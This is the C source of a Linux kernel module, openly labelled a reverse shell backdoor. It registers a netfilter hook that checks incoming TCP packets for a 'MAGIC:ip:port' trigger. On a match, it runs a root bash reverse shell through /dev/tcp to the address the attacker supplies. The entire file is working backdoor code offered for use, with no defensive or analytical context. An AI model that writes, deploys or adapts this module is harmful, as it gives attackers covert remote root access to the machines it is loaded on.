#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/kmod.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/workqueue.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Researcher");
MODULE_DESCRIPTION("Bash Reverse Shell Netfilter Module");

#define MAGIC_PREFIX "MAGIC:"
#define MAGIC_PREFIX_LEN 6

static struct nf_hook_ops nfho;

struct backdoor_work {
    char ip[16];
    char port[6];
    struct work_struct work;
};
static struct workqueue_struct *wq;

static void execute_reverse_shell(struct work_struct *work) {
    struct backdoor_work *bwork = container_of(work, struct backdoor_work, work);
    char cmd[256];
    
    // Create pure bash reverse shell command
    snprintf(cmd, sizeof(cmd), 
             "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'",
             bwork->ip, bwork->port);
             
    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

    printk(KERN_INFO "Executing reverse shell to %s:%s\n", bwork->ip, bwork->port);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    kfree(bwork);
}

unsigned int backdoor_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct tcphdr *tcph;
    char *data;
    unsigned int data_len;

    if (!skb || skb_linearize(skb) < 0)
        return NF_ACCEPT;

    iph = ip_hdr(skb);
    if (iph->protocol != IPPROTO_TCP)
        return NF_ACCEPT;

    tcph = tcp_hdr(skb);
    data = (char *)((unsigned char *)tcph + (tcph->doff * 4));
    data_len = skb->len - (data - (char *)skb->data);

    if (data_len <= MAGIC_PREFIX_LEN || strncmp(data, MAGIC_PREFIX, MAGIC_PREFIX_LEN) != 0)
        return NF_ACCEPT;

    char *start = data + MAGIC_PREFIX_LEN;
    char *sep = memchr(start, ':', data_len - MAGIC_PREFIX_LEN);
    if (!sep || (sep - start) >= 16)
        return NF_ACCEPT;

    char ip[16] = {0};
    char port[6] = {0};
    unsigned int ip_len = sep - start;
    unsigned int port_len = data_len - (sep - data) - 1;
    
    if (port_len >= sizeof(port))
        return NF_ACCEPT;

    memcpy(ip, start, ip_len);
    memcpy(port, sep + 1, port_len);
    ip[ip_len] = '\0';
    port[port_len] = '\0';

    printk(KERN_INFO "[+] Received MAGIC payload: %s:%s\n", ip, port);

    // Schedule work for safe execution
    struct backdoor_work *bwork = kmalloc(sizeof(*bwork), GFP_ATOMIC);
    if (!bwork) {
        printk(KERN_ERR "Failed to allocate work struct\n");
        return NF_ACCEPT;
    }
    
    strscpy(bwork->ip, ip, sizeof(bwork->ip));
    strscpy(bwork->port, port, sizeof(bwork->port));
    INIT_WORK(&bwork->work, execute_reverse_shell);
    
    if (!queue_work(wq, &bwork->work)) {
        printk(KERN_WARNING "Work already queued, freeing\n");
        kfree(bwork);
    }

    return NF_ACCEPT;
}

static int __init backdoor_init(void) {
    // Create workqueue
    wq = create_singlethread_workqueue("reverse_shell_wq");
    if (!wq)
        return -ENOMEM;

    // Register netfilter hook
    nfho.hook = backdoor_hook;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);
    
    printk(KERN_INFO "[*] Reverse shell module loaded\n");
    return 0;
}

static void __exit backdoor_exit(void) {
    nf_unregister_net_hook(&init_net, &nfho);
    if (wq) {
        flush_workqueue(wq);
        destroy_workqueue(wq);
    }
    printk(KERN_INFO "[-] Reverse shell module unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);